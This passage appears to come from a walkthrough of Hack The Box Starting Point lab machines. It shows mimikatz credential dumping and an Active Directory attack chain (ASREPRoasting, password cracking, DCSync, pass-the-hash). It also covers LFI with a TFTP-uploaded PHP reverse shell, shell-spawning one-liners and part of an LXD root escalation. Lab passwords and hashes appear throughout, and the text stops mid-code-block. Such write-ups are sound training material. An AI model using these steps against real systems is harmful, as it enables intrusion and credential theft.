<div style="width:100%; background-color:#252b34;text-align: left;;border: 1px solid black;"><img width="50%"  src="media/image124.png"></div>
<p>The 64 bit versione is the one we need</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image125.png"></div>
<p>We use the meterpeter session to upload the “mimikatz.exe” file:</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image126.png"></div>
<p>As a “<strong>nt authority\system</strong>” we execute mimikatz and use the
<strong>sekurlsa</strong> command to extract logon passwords</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">./mimikatz.exe
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image127.png"></div>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">sekurlsa::logonpasswords
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image128.png"></div>
<p>And we find the password “<strong>Password1234!”</strong> for domain user
“<strong>Sandra”</strong>.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image129.png"></div>
<h2 id="9656-pathfinder">▸ PATHFINDER</h2>
<ul>
<li>Machine : <b>Pathfinder</b> </li>
<li>Ip: <b>10.10.10.29</b></li>
</ul>
<h3 id="9702-enumeration-2">◦ Enumeration</h3>
<p>This time we are going to use “masscan” (Mass IP port scanner)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@kali:/# masscan -p 1-65535 10.10.10.30 -e tun0 --rate<span class="o">=</span><span class="m">1000</span>
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image130.png"></div>
<p>Port <strong>88</strong> is typically associated with Kerberos</p>
<p>Port <strong>389</strong> with LDAP, which indicates that this is a Domain
Controller.</p>
<p>We note that WinRM is enabled on port <strong>5985</strong>.</p>
<p>We can attempt to enumerate Active Directory using the credentials we
obtained in a previous machine:</p>
<ul>
<li>
<p><strong>sandra</strong></p>
</li>
<li>
<p><strong>Password1234!</strong></p>
</li>
</ul>
<p>We can achieve this using a python bloodhound injester, but first, we
need to install <strong>neo4j</strong> and <strong>BloodHound</strong>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kali@kali:$  sudo apt  install  neo4j
kali@kali:$  sudo apt  install  bloodhound
</code></pre></td></tr></table>
</div>
</div><p>Let’s install now the python bloodhound injester <strong><a href="https://github.com/fox-it/BloodHound.py" target="_blank" rel="noopener noreffer">https://github.com/fox-it/BloodHound.py</a></strong>
It can also be installed using pip:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kali@kali:$  sudo  pip install bloodhound
</code></pre></td></tr></table>
</div>
</div><p>Let’s run the command</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">bloodhound-python -d megacorp.local -u sandra -p &#34;Password1234!&#34; -gc pathfinder.megacorp.local -c all -ns 10.10.10.30
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="80%"  src="media/image131.png"></div>
<p>The BloodHound injester created some json files ready to be imported
into BloodHound.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image132.png"></div>
<p>Next, we need to configure the neo4j service. We can accomplish this by
running the following command</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kali@kali: ~/HTB/StartingPoint/Pathfinder$ sudo  neo4j console
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image133.png"></div>
<p>You will be then prompted to insert or change(at first login) your
password.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image134.png"></div>
<p>If connected we will see</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image135.png"></div>
<p>Next, we start BloodHound</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bloodhound --no-sandbox
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image136.png"></div>
<p>Ensure you have a connection to the database; indicated by a ✔️ symbol
at the top of the three input fields. The default username is neo4j with
the password previously set.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image137.png"></div>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image138.png"></div>
<p>Below before importing the .json files:</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image139.png"></div>
<p>Opening BloodHound, we can drag and drop the .json files, and BloodHound
will begin to analyze the data.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image140.png"></div>
<p>We can select various queries, of which some very useful ones are
<strong>Shortest Paths to High value Targets</strong> and <strong>Find Principles with
DCSync Rights</strong>.</p>
<p>While the latter query returns this:</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image141.png"></div>
<p>Let’s select the domain “MEGACORP.LOCAL”</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="80%"  src="media/image142.png"></div>
<p>The query will generate the below graph for domain “MEGACORP.LOCAL”</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image143.png"></div>
<p>We can see that the <strong>svc_bes</strong> has <strong>GetChangesAll</strong> privileges to thedomain. This means that the account has the ability to request replication data from the domain controller, and gain sensitive information such as user hashes.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image144.png"></div>
<h3 id="9702-lateral-movement-1">◦ Lateral Movement</h3>
<p>It&rsquo;s worth checking if Kerberos pre-authentication has been disabled for this account, which means it is vulnerable to <em>ASREPRoasting</em>. We can check this using a tool such as Impacket&rsquo;s GetNPUsers.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  GetNPUsers.py megacorp.local/svc<span class="se">\_</span>bes -request -no-pass -dc-ip 10.10.10.30
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image145.png"></div>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image146.png"></div>
<p>Below out TGT ticket</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">$krb5asrep$23$svc_bes@MEGACORP.LOCAL:0969b177c87205436a4ef15e3227c3af$f967e09d463ebcfa60a01c5ddb3606de78b62d8629e8de55578236534abf7a8442f3b07dfe0b8fa622dceabb66586c99dec8a3e4629a099fb01acc5721e0ca5ebf59fa0f6841f456a7a855ded8fb2b5860066cca671c8ea362c335c5a1a0bde1a9091b629535fec165388e46b3069c002dd45569a89f6d30f9139911968364ae84bf06de3d39cdcbb3a44b373f71c3ff3f030f3896fa4f698693889e8677136e942d9ba1e3175dc70e67f1b998d52170f3347dcc766fda831f9cd5d1f7d94706f3b423a9bf75869a6772280f69d2f2855a3b855ee221f053478f7e54c98c7fde493f85ce3cec16e47f0c20ced4a65b14
</code></pre></td></tr></table>
</div>
</div><p>Once obtained the TGT ticket for the <strong>svc_bes,</strong> let’s save it into a
file called hash(it could be any name).</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image147.png"></div>
<p>We could have also used:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">GetNPUsers.py megacorp.local/svc<span class="se">\_</span>bes -request -no-pass -dc-ip 10.10.10.30 <span class="p">|</span> grep krb &gt; <span class="nb">hash</span>
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image148.png"></div>
<a name="Sheffield19"></a>
We will use JTR in conjunction with rockyou.txt to obtain the plaintext
password (but we could have also used Hashcat)
``` shell 
kali@kali:~/HTB/StartingPoint/Pathfinder$  john hash -wordlist=/usr/share/wordlists/rockyou.txt
```
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image149.png"></div>
<p>Below the password for <strong>svc_bes : Sheffield19</strong></p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img  width="50%"  src="media/image150.png"></div>
<p>It is now possible to access the server as <strong>svc_bes</strong> using **WinRM **</p>
<p>(With the <strong>nmap scan</strong> we noted that WinRM was enabled on port
<strong>5985)</strong></p>
<br>
<p><strong>Let’s install “<em>evil-winrm</em>” (Installation directly as ruby gem)</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~/HTB/StartingPoint/Pathfinder$ sudo gem install evil-winrm
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image151.png"></div>
<p>And run it against 10.10.10.30 using “svc_bes” credentials</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kali@kali:~/HTB/StartingPoint/Pathfinder$ sudo evil-winrm -i 10.10.10.30 -u svc<span class="se">\_</span>bes -p Sheffield19
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image152.png"></div>
<h3 id="9702-privilege-escalation-2">◦ Privilege Escalation</h3>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image153.png"></div>
<p>In order to leverage the <strong>GetChangesAll</strong> permission, we can use secretsdump.py (link) from Impacket to perform a DCSync attack and dump the NTLM hashes of all domain users.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kali@kali:~/HTB/StartingPoint/Pathfinder$ sudo secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc<span class="se">\_</span>bes:Sheffield19@10.10.10.30
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="80%"  src="media/image154.png"></div>
<p>We can see the default domain Administrator NTLM hash</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image155.png"></div>
<p>We can use this in a <em>PTH attack</em> (Pass-the-Hash attack) to gain elevated access to the system.</p>
<p>For this, we can use Impacket&rsquo;s <strong>psexec.py</strong> as follow:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">psexec.py megacorp.local/administrator@10.10.10.30 -hashes &lt;NTML hash&gt;:&lt;NTLM hash&gt;
</code></pre></td></tr></table>
</div>
</div><p>For &lt;<strong>NTML hash</strong>&gt;:&lt;<strong>NTLM hash</strong>&gt; we will use:</p>
<ul>
<li>
<p><strong>NTML hash &ndash;&gt; aad3b435b51404eeaad3b435b51404ee</strong></p>
</li>
<li>
<p><strong>NTLM hash &ndash;&gt; 8a4b77d52b1845bfe949ed1b9643bb18</strong></p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" class="zoom"><img width="80%"  src="media/image156.png"></div>
<p>An as we can see we gain elevated access to the system</p>
<div style="width:100%; background-color:#252b34;text-align: center;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image157.png"></div>
<h2 id="9656-included-linux">▸ INCLUDED (Linux)</h2>
<ul>
<li>Machine : <b>Included (Linux)</b> </li>
<li>Ip: <b>10.10.10.55</b></li>
</ul>
<h3 id="9702-enumeration-3">◦ Enumeration</h3>
<p>Let’s run nmap with option –A  (to enable: OS detection, version detection, script scanning, and traceroute)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kali@kali: ~ $  sudo nmap -A -v 10.10.10.55
….
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
<span class="p">|</span> http-methods: 
<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
<span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span> http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
<span class="p">|</span>_Requested resource was http://10.10.10.55/?file<span class="o">=</span>index.php
<span class="p">|</span>_https-redirect: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><p>From a TCP scan we found only port 80 (Apache httpd 2.4.29 ((Ubuntu)))</p>
<p>We can navigate to the website in a browser.</p>
<div style="width:100%; background-color:#252b34;text-align: center;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image159.png"></div>
<p>Let’s try scanning the UDP ports</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kali@kali: ~ $  sudo  nmap  -sU  -v  10.10.10.55
<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> kali:
...
Not shown: <span class="m">999</span> closed ports
PORT   STATE   SERVICE
69/udp  open   filtered tftp
</code></pre></td></tr></table>
</div>
</div><p>The UDP scan found <strong>port 69</strong> to be open, which hosts the <strong>TFTP</strong>
service.</p>
<p>TFTP or &ldquo;Trivial File Transfer Protocol&rdquo;, is similar to FTP but much
simpler. It provides functionality only for uploading or downloading
files from a server.</p>
<p>Let&rsquo;s see if we can connect to TFTP and upload a file.</p>
<p>We first create a file named “<strong>test.txt”</strong></p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;"><img width="50%"  src="media/image161.png"></div>
<p>We connect and confirm that we can upload files.</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;"><img width="50%"  src="media/image162.png"></div>
<h3 id="9702-lfilocal-file-inclusion">◦ LFI(Local File Inclusion)</h3>
<p>Let’s check if the URL of the website “<strong>http://10.10.10.55/?file=index.php</strong>&quot; is vulnerable to <strong><em>Local File Inclusion</em>.</strong></p>
<div style="width:100%; background-color:#252b34;text-align: center;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image163.png"></div>
<p>We can test by changing the URL to the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  http://10.10.10.55/?file=../../../../etc/passwd
</code></pre></td></tr></table>
</div>
</div><p>This is successful, and <strong>passwd</strong> contents are returned by the server.</p>
<div style="width:100%; background-color:#252b34;text-align: center;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image164.png"></div>
<h3 id="9702-foothold-4">◦ Foothold</h3>
<p>We can try upload and execute a “PHP reverse shell ” by combining the LFI
vulnerability with the TFTP service. This happens due to the inclusion
of the PHP code by the vulnerable page, which results in it&rsquo;s execution.</p>
<p>First we have to modify the PHP reverse shell  which cane be taken from
<em>here</em> if not present on our kali system.</p>
<div style="width:100%; background-color:#252b34;text-align:left;border: 1px solid black;" ><img width="50%"  src="media/image165.png"></div>
<p>Let’s copy the file into our folder with name “<strong>rev.php</strong>”</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="70%"  src="media/image166.png"></div>
<p>As usual, let’s modify the code for our needs:</p>
<div style="width:100%; background-color:#252b34;text-align: center;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image167.png"></div>
<p>Once changed the IP address and the port, we upload our PHP reverse
shell .</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;"><img width="60%"  src="media/image168.png"></div>
<p>Let&rsquo;s start a netcat listener before navigating to the shell .</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;"><img width="60%"  src="media/image169.png"></div>
<p>Next, we can use the LFI to access the reverse shell .</p>
<ul>
<li>The <em>default TFTP root folde</em>r is <strong>/var/lib/tftpboot.</strong></li>
</ul>
<p>Navigating to
<em>http://10.10.10.55/?file=../../../../var/lib/tftpboot/rev.php</em>, due to
the inclusion of the PHP code by the vulnerable page, will results in
the PHP reverse shell  execution.</p>
<div style="width:100%; background-color:#252b34;text-align: center;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image170.png"></div>
<br>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="80%"  src="media/image171.png"></div>
<p><em><strong>We could have also used the “curl” tool as follow:</strong></em></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kali@kali:~/HTB/StartingPoint/Included$ curl  http://10.10.10.55/?file<span class="o">=</span>../../../../var/lib/tftpboot/rev.php
</code></pre></td></tr></table>
</div>
</div><p>And we get the reverse shell :</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="80%"  src="media/image173.png"></div>
<p>The low privilged www-data user isn&rsquo;t allowed to read user files, let’s
update the shell  as www-data</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="nv">SHELL</span><span class="o">=</span>/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
<span class="nb">fg</span>
reset
xterm
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="50%"  src="media/image174.png"></div>
<p>Below some other ways to spwan a TTY shell . The top 3 would be most
successful in general for spawning from the command line.</p>
<ul>
<li>
<p><strong>python3 -c &lsquo;import pty; pty.spawn(&quot;/bin/sh&quot;)'</strong></p>
</li>
<li>
<p><strong>echo os.system('/bin/shell &lsquo;)</strong></p>
</li>
<li>
<p><strong>/bin/sh -i</strong></p>
</li>
<li>
<p><strong>perl —e &lsquo;exec &ldquo;/bin/sh&rdquo;;'</strong></p>
</li>
<li>
<p><strong>perl: exec &ldquo;/bin/sh&rdquo;;</strong></p>
</li>
<li>
<p><strong>ruby: exec &ldquo;/bin/sh&rdquo;</strong></p>
</li>
<li>
<p><strong>lua: os.execute('/bin/sh&rsquo;)</strong></p>
</li>
<li>
<p>(From within IRB) <strong>exec &ldquo;/bin/sh&rdquo;</strong></p>
</li>
<li>
<p>(From within vi) <strong>:!shell</strong></p>
</li>
<li>
<p>(From within vi) <strong>:set shell =/bin/shell :shell</strong></p>
</li>
<li>
<p>(From within nmap) <strong>!sh</strong></p>
</li>
</ul>
<p>Many of these will also allow you to escape jail shells (link)</p>
<p>From the etc/passwd file we see that we can see there is a user “mike”</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="50%"  src="media/image175.png"></div>
<p>We can switch to the user mike using the su command (link) with the password founded on the previous machine (<a href="#Sheffield19">Pathfinder</a>).</p>
<div style="width:100%; background-color:#252b34;text-align: center;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image176.png"></div>
<p>As shown below, once updated the shell as www-data, we can logged (using the su command) in as mike.</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="50%"  src="media/image177.png"></div>
<p>At location /home/mike we can find the user.txt file</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="25%"  src="media/image178.png"></div>
<p>We also notice that mike is a <strong>lxd</strong> member</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="50%"  src="media/image179.png"></div>
<p>The LXD group is a high-privileged linux group; a member of the local
“lxd” group can instantly escalate the privileges to root on the host
operating system.
<br><br></p>
<p>▹ <em><strong>Container and virtualization tools</strong></em>(<a href="https://linuxcontainers.org/" target="_blank">link</a>)</p>
<p>While VMs supply a complete environment, system containers offer an environment as close as possible to the one you&rsquo;d get from a VM, but without the overhead that comes with running a separate kernel and simulating all the hardware.</p>
<h3 id="x25b9-lxd">▹ LXD</h3>
<p>◦ <em><strong>Introduction to LXD and LXC</strong></em>  (<a href="https://linuxcontainers.org/" target="_blank">link</a>)</p>
<p>Introduction to LXD and LXC (link)
The vulnerability exists even with the LXD snap package , this is irrespective of whether that user has been granted sudo rights and does not require them to enter their password.
LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.
One of them is to use the LXD API to mount the host’s root filesystem into a container which is going to use in this post. This gives a low-privilege user root access to the host filesystem.</p>
<p>•	<em><strong>Linux Container (LXC)</strong></em> are often considered as a lightweight virtualization technology that is something in the middle between a chroot and a completely developed virtual machine, which creates an environment as close as possible to a Linux installation but without the need for a separate kernel.</p>
<p>•	<em><strong>Linux daemon (LXD)</strong></em> is the lightervisor, or lightweight container hypervisor. LXD is building on top of a container technology called LXC which was used by Docker before. It uses the stable LXC API to do all the container management behind the scene, adding the REST API on top and providing a much simpler, more consistent user experience.</p>
<h3 id="9702-lxd-privilege-escalation">◦ LXD Privilege Escalation</h3>
<p>Privilege escalation through lxd requires the access of local account.</p>
<p><strong>Note</strong>: the most important condition is that the user should be a memberof lxd group (<em><strong>in our case is 108, but it could have been any othernumber</strong></em>)</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="30%"  src="media/image181.png"></div>
<p>First, we have create an image for lxd, thus we first need to clone on
our local machine the following build-alpine repository</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git clone https://github.com/saghul/lxd-alpine-builder.git
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="70%"  src="media/image182.png"></div>
<p>We move into the lxd-alpine-builder</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="70%"  src="media/image183.png"></div>
<p>And execute the “./build-alpine” file</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="70%"  src="media/image184.png"></div>
<br>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="70%"  src="media/image185.png"></div>
<p>On running the above command, a “<strong>tar.gz</strong>” file is created. Now we
have to transferred this “tar.gz” file from the attacker machine to the
host (victim) machine.</p>
<p>We can use the following python command to start a local webserver</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">python -m SimpleHTTPServer <span class="m">8888</span>
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="70%"  src="media/image186.png"></div>
<p>On the host(victim) machine we can download the file “<strong>tar.gz</strong>” using
the command “wget” as follow:</p>
<ul>
<li>
<p>First we move into the /tmp folder</p>
</li>
<li>
<p>Then we run the command</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">mike@included:/$ <span class="nb">cd</span> /tmp
mike@included:/tmp$ wget 10.10.14.3:8888/alpine-v3.10-x86_64-20191008_1227.tar.gz
</code></pre></td></tr></table>
</div>
</div><p>We will see that our file has been transferred/downloaded.</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="70%"  src="media/image187.png"></div>
<p>Next, we run the following commands to get the root.</p>
<p>First we built the image and can be added as an image to LXD as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">mike@included:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200728_1438.tar.gz --alias &lt;aliasName&gt;
mike@included:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200728_1438.tar.gz --alias rootimage
</code></pre></td></tr></table>
</div>
</div><p>In the above command we used “rootimage” as ALIAS but it could ahve been
any name</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="70%"  src="media/image188.png"></div>
<p>We can use the list command to check the list of images</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">mike@included:/$
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="70%"  src="media/image189.png"></div>
<p>The command above will let us have access to the entire filesystem from
within the container.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
